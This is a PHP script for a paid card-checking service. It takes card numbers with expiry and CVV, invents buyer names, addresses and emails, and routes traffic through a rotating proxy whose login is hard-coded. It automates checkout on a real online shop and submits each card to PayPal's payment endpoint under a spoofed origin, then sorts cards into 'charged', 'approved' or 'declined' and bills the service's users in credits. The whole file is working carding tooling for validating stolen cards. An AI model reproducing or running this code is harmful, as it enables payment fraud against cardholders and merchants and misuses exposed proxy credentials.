<?php
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Verificar sesión y créditos
session_start();
$path = $_SERVER["DOCUMENT_ROOT"];
require_once $path . "/api/v1.1/core/brain.php";

if (!isset($_SESSION["user_id"])) {
    echo json_encode(['result' => 'declined', 'error' => 'No hay sesión activa']);
    exit;
}

$user = $_SESSION["user_id"];
$query = $connection->prepare("SELECT * FROM breathe_users WHERE id=:id");
$query->bindParam("id", $user, PDO::PARAM_STR);
$query->execute();
$result = $query->fetch(PDO::FETCH_ASSOC);

$credits = $result["creditos"];

if ($credits < 2) {
    echo json_encode(['result' => 'declined', 'error' => 'Créditos insuficientes']);
    exit;
}

class Bot {
    private $debug_log = 'debug.log';
    private $proxies = [];

    public function __construct() {
        $this->load_proxies();
    }

    private function log_debug($message) {
        file_put_contents($this->debug_log, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
    }

    private function load_proxies() {
        // Configurar proxy de Webshare
        $this->proxies[] = [
            'host' => 'p.webshare.io',
            'port' => '80',
            'username' => 'rvrqudhp-rotate',
            'password' => '918d6xnqwql1'
        ];
        $this->log_debug("Loaded Webshare proxy");
        return true;
    }

    private function get_random_proxy($used_proxies = []) {
        if (empty($this->proxies)) {
            return null;
        }
        return $this->proxies[0]; // Siempre devuelve la proxy de Webshare
    }

    private function execute_curl_with_proxy($ch, $max_retries = 3) {
        $attempt = 0;
        $used_proxies = [];
        while ($attempt < $max_retries) {
            $proxy = $this->get_random_proxy($used_proxies);
            if (!$proxy) {
                $this->log_debug("No more proxies available");
                return false;
            }
            $used_proxies[] = $proxy['host'] . ':' . $proxy['port'];
            curl_setopt($ch, CURLOPT_PROXY, "{$proxy['host']}:{$proxy['port']}");
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "{$proxy['username']}:{$proxy['password']}");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            $response = curl_exec($ch);
            $error = curl_error($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $this->log_debug("cURL attempt $attempt: HTTP $http_code, Error: $error, Proxy: {$proxy['host']}:{$proxy['port']}");
            if ($response === false || $http_code == 0 || strpos($error, 'proxy') !== false || strpos($error, 'connect') !== false) {
                $attempt++;
                $this->log_debug("Proxy failed, retrying ($attempt/$max_retries)");
                continue;
            }
            return $response;
        }
        $this->log_debug("Max retries reached");
        return false;
    }

    private function generate_user_agent() {
        $platforms = ["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"];
        $browsers = ["Chrome/124.0.0.0", "Firefox/125.0", "Safari/537.36"];
        $platform = $platforms[array_rand($platforms)];
        $browser = $browsers[array_rand($browsers)];
        return "Mozilla/5.0 ($platform) AppleWebKit/537.36 (KHTML, like Gecko) $browser";
    }

    private function generate_full_name() {
        $first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour"];
        $last_names = ["Khalil", "Abdullah", "Alwan", "Smith", "Johnson", "Williams", "Jones", "Brown"];
        return [$first_names[array_rand($first_names)], $last_names[array_rand($last_names)]];
    }

    private function generate_address() {
        $cities = ["New York", "Los Angeles", "Chicago", "Houston"];
        $states = ["NY", "CA", "IL", "TX"];
        $streets = ["Main St", "Park Ave", "Oak St", "Cedar St"];
        $zip_codes = ["10001", "90001", "60601", "77001"];
        $index = array_rand($cities);
        return [
            $cities[$index],
            $states[$index],
            rand(1, 999) . " " . $streets[array_rand($streets)],
            $zip_codes[$index]
        ];
    }

    private function generate_random_account() {
        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        $name = '';
        for ($i = 0; $i < 20; $i++) {
            $name .= $chars[rand(0, strlen($chars) - 1)];
        }
        $number = '';
        for ($i = 0; $i < 4; $i++) {
            $number .= rand(0, 9);
        }
        return "$name$number@gmail.com";
    }

    private function generate_phone() {
        $number = '';
        for ($i = 0; $i < 7; $i++) {
            $number .= rand(0, 9);
        }
        return "303$number";
    }

    private function generate_random_string($length) {
        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        $result = '';
        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $result;
    }

    private function generate_random_code() {
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $code = '';
        for ($i = 0; $i < 17; $i++) {
            $code .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $code;
    }

    public function process_request($card) {
        // Validate card format
        if (!preg_match('/^(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$/', $card, $matches)) {
            $this->log_debug("Invalid card format: $card");
            return ['result' => 'declined', 'error' => 'Invalid card format! Use ccnum|mm|yyyy|cvv'];
        }

        $n = $matches[1];
        $mm = str_pad($matches[2], 2, '0', STR_PAD_LEFT);
        $yy = strlen($matches[3]) == 4 && strpos($matches[3], "20") === 0 ? substr($matches[3], 2) : $matches[3];
        $cvc = $matches[4];

        $this->log_debug("Processing card: $card");

        if (empty($this->proxies)) {
            $this->log_debug("No valid proxies found");
            return ['result' => 'declined', 'error' => 'proxies.txt not found or empty'];
        }

        // Generate random data
        $user_agent = $this->generate_user_agent();
        list($first_name, $last_name) = $this->generate_full_name();
        list($city, $state, $street_address, $zip_code) = $this->generate_address();
        $acc = $this->generate_random_account();
        $num = $this->generate_phone();

        $this->log_debug("Generated data: user_agent=$user_agent, first_name=$first_name, last_name=$last_name, email=$acc");

        // Initialize cURL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);

        // Step 1: Add to cart
        $fields = [
            'quantity' => '1',
            'add-to-cart' => '4451'
        ];
        $boundary = uniqid();
        $body = '';
        foreach ($fields as $key => $value) {
            $body .= "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"$key\"\r\n\r\n";
            $body .= "$value\r\n";
        }
        $body .= "--$boundary--\r\n";

        $headers = [
            "Content-Type: multipart/form-data; boundary=$boundary",
            "User-Agent: $user_agent",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Origin: https://switchupcb.com",
            "Referer: https://switchupcb.com/shop/i-buy/",
            "Accept-Language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6"
        ];

        curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/shop/i-buy/');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $this->log_debug("Step 1: Adding to cart");
        if ($this->execute_curl_with_proxy($ch) === false) {
            $this->log_debug("Failed to add to cart due to proxy issues");
            curl_close($ch);
            return ['result' => 'declined', 'error' => 'Failed to add to cart due to proxy issues'];
        }

        // Step 2: Access checkout page
        $headers = [
            "User-Agent: $user_agent",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer: https://switchupcb.com/cart/",
            "Accept-Language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6"
        ];

        curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/checkout/');
        curl_setopt($ch, CURLOPT_POST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $this->log_debug("Step 2: Accessing checkout page");
        $response = $this->execute_curl_with_proxy($ch);
        if ($response === false) {
            $this->log_debug("Failed to access checkout page due to proxy issues");
            curl_close($ch);
            return ['result' => 'declined', 'error' => 'Failed to access checkout page due to proxy issues'];
        }

        // Extract nonces
        preg_match('/update_order_review_nonce":"(.*?)"/', $response, $sec_match);
        $sec = $sec_match[1] ?? '';
        preg_match('/save_checkout_form.*?nonce":"(.*?)"/', $response, $nonce_match);
        $nonce = $nonce_match[1] ?? '';
        preg_match('/name="woocommerce-process-checkout-nonce" value="(.*?)"/', $response, $check_match);
        $check = $check_match[1] ?? '';
        preg_match('/create_order.*?nonce":"(.*?)"/', $response, $create_match);
        $create = $create_match[1] ?? '';

        if (!$sec || !$nonce || !$check || !$create) {
            $this->log_debug("Failed to extract nonces: sec=$sec, nonce=$nonce, check=$check, create=$create");
            curl_close($ch);
            return ['result' => 'declined', 'error' => 'Failed to extract nonces'];
        }
        $this->log_debug("Nonces extracted: sec=$sec, nonce=$nonce, check=$check, create=$create");

        // Step 3: Update order review
        $headers = [
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent: $user_agent",
            "Accept: */*",
            "Origin: https://switchupcb.com",
            "Referer: https://switchupcb.com/checkout/",
            "Accept-Language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6"
        ];

        $data = "security=$sec&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=" . urlencode("wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2F&wc_order_attribution_session_start_time=2025-01-15+16%3A33%3A26&wc_order_attribution_session_pages=15&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=" . urlencode($user_agent) . "&billing_first_name=$first_name&billing_last_name=$last_name&billing_company=&billing_country=US&billing_address_1=New+York&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone=$num&billing_email=$acc&account_username=&account_password=&order_comments=&g-recaptcha-response=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&terms-field=1&woocommerce-process-checkout-nonce=$check&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review");

        curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/?wc-ajax=update_order_review');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $this->log_debug("Step 3: Updating order review");
        if ($this->execute_curl_with_proxy($ch) === false) {
            $this->log_debug("Failed to update order review due to proxy issues");
            curl_close($ch);
            return ['result' => 'declined', 'error' => 'Failed to update order review due to proxy issues'];
        }

        // Step 4: Create order
        $headers = [
            "Content-Type: application/json",
            "User-Agent: $user_agent",
            "Accept: */*",
            "Origin: https://switchupcb.com",
            "Referer: https://switchupcb.com/checkout/",
            "Accept-Language: en-US,en;q=0.9"
        ];

        $json_data = [
            'nonce' => $create,
            'payer' => null,
            'bn_code' => 'Woo_PPCP',
            'context' => 'checkout',
            'order_id' => '0',
            'payment_method' => 'ppcp-gateway',
            'funding_source' => 'card',
            'form_encoded' => "billing_first_name=$first_name&billing_last_name=$last_name&billing_company=&billing_country=US&billing_address_1=" . urlencode($street_address) . "&billing_address_2=&billing_city=" . urlencode($city) . "&billing_state=$state&billing_postcode=$zip_code&billing_phone=$num&billing_email=$acc&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=" . urlencode($user_agent) . "&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$check&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review",
            'createaccount' => false,
            'save_payment_method' => false
        ];

        curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/?wc-ajax=ppc-create-order');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $this->log_debug("Step 4: Creating order");
        $response = $this->execute_curl_with_proxy($ch);
        if ($response === false) {
            $this->log_debug("Failed to create order due to proxy issues");
            curl_close($ch);
            return ['result' => 'declined', 'error' => 'Failed to create order due to proxy issues'];
        }

        $response_data = json_decode($response, true);
        if (!isset($response_data['data']['id']) || !isset($response_data['data']['custom_id'])) {
            $this->log_debug("Invalid order creation response");
            curl_close($ch);
            return ['result' => 'declined', 'error' => 'Invalid order creation response'];
        }

        $id = $response_data['data']['id'];
        $pcp = $response_data['data']['custom_id'];
        $this->log_debug("Order created: id=$id, custom_id=$pcp");

        // Step 5: Access PayPal card fields
        $lol1 = $this->generate_random_string(10);
        $lol2 = $this->generate_random_string(10);
        $lol3 = $this->generate_random_string(11);
        $session_id = "uid_{$lol1}_{$lol3}";
        $button_session_id = "uid_{$lol2}_{$lol3}";

        $headers = [
            "User-Agent: $user_agent",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer: https://www.paypal.com/smart/buttons",
            "Accept-Language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6"
        ];

        $params = http_build_query([
            'sessionID' => $session_id,
            'buttonSessionID' => $button_session_id,
            'locale.x' => 'ar_EG',
            'commit' => 'true',
            'hasShippingCallback' => 'false',
            'env' => 'production',
            'country.x' => 'EG',
            'sdkMeta' => 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
            'disable-card' => '',
            'token' => $id
        ]);

        curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/smart/card-fields?$params");
        curl_setopt($ch, CURLOPT_POST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $this->log_debug("Step 5: Accessing PayPal card fields");
        if ($this->execute_curl_with_proxy($ch) === false) {
            $this->log_debug("Failed to access PayPal card fields due to proxy issues");
            curl_close($ch);
            return ['result' => 'declined', 'error' => 'Failed to access PayPal card fields due to proxy issues'];
        }

        // Step 6: Submit payment
        $random_code = $this->generate_random_code();
        $headers = [
            "Content-Type: application/json",
            "User-Agent: $user_agent",
            "Accept: */*",
            "Origin: https://my.tinyinstaller.top",
            "Referer: https://my.tinyinstaller.top/checkout/",
            "Accept-Language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6"
        ];

        $json_data = [
            'query' => '
                mutation payWithCard(
                    $token: String!
                    $card: CardInput!
                    $phoneNumber: String
                    $firstName: String
                    $lastName: String
                    $shippingAddress: AddressInput
                    $billingAddress: AddressInput
                    $email: String
                    $currencyConversionType: CheckoutCurrencyConversionType
                    $installmentTerm: Int
                    $identityDocument: IdentityDocumentInput
                ) {
                    approveGuestPaymentWithCreditCard(
                        token: $token
                        card: $card
                        phoneNumber: $phoneNumber
                        firstName: $firstName
                        lastName: $lastName
                        email: $email
                        shippingAddress: $shippingAddress
                        billingAddress: $billingAddress
                        currencyConversionType: $currencyConversionType
                        installmentTerm: $installmentTerm
                        identityDocument: $identityDocument
                    ) {
                        flags {
                            is3DSecureRequired
                        }
                        cart {
                            intent
                            cartId
                            buyer {
                                userId
                                auth {
                                    accessToken
                                }
                            }
                            returnUrl {
                                href
                            }
                        }
                        paymentContingencies {
                            threeDomainSecure {
                                status
                                method
                                redirectUrl {
                                    href
                                }
                                parameter
                            }
                        }
                    }
                }
            ',
            'variables' => [
                'token' => $id,
                'card' => [
                    'cardNumber' => $n,
                    'type' => 'VISA',
                    'expirationDate' => "$mm/20$yy",
                    'postalCode' => $zip_code,
                    'securityCode' => $cvc
                ],
                'firstName' => $first_name,
                'lastName' => $last_name,
                'billingAddress' => [
                    'givenName' => $first_name,
                    'familyName' => $last_name,
                    'line1' => 'New York',
                    'line2' => null,
                    'city' => 'New York',
                    'state' => 'NY',
                    'postalCode' => '10080',
                    'country' => 'US'
                ],
                'email' => $acc,
                'currencyConversionType' => 'VENDOR'
            ],
            'operationName' => null
        ];

        curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $this->log_debug("Step 6: Submitting payment");
        $response = $this->execute_curl_with_proxy($ch);
        curl_close($ch);

        if ($response === false) {
            $this->log_debug("Failed to submit payment due to proxy issues");
            return ['result' => 'declined', 'error' => 'Failed to submit payment due to proxy issues'];
        }

        // Process response
        if (strpos($response, 'ADD_SHIPPING_ERROR') !== false ||
            strpos($response, '"status": "succeeded"') !== false ||
            strpos($response, 'Thank You For Donation.') !== false ||
            strpos($response, 'Your payment has already been processed') !== false ||
            strpos($response, 'Success ') !== false) {
            $this->log_debug("Payment successful");
            
            // Cobrar 2 créditos por tarjeta aprobada
            $balance = $credits - 2;
            $query = $connection->prepare("UPDATE breathe_users SET creditos=:creditos WHERE id=:id");
            $query->bindParam("id", $user, PDO::PARAM_STR);
            $query->bindParam("creditos", $balance, PDO::PARAM_STR);
            $query->execute();
            
            return ['result' => 'charged'];
        } elseif (strpos($response, 'INVALID_SECURITY_CODE') !== false ||
                  strpos($response, 'EXISTING_ACCOUNT_RESTRICTED') !== false ||
                  strpos($response, 'INVALID_BILLING_ADDRESS') !== false) {
            $this->log_debug("Payment approved but not charged");
            
            // Cobrar 2 créditos por tarjeta aprobada
            $balance = $credits - 2;
            $query = $connection->prepare("UPDATE breathe_users SET creditos=:creditos WHERE id=:id");
            $query->bindParam("id", $user, PDO::PARAM_STR);
            $query->bindParam("creditos", $balance, PDO::PARAM_STR);
            $query->execute();
            
            return ['result' => 'approved'];
        } else {
            $this->log_debug("Payment declined");
            return ['result' => 'declined'];
        }
    }
}

// Process request
$bot = new Bot();
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
header('Content-Type: application/json');
echo json_encode($bot->process_request($card));
?> 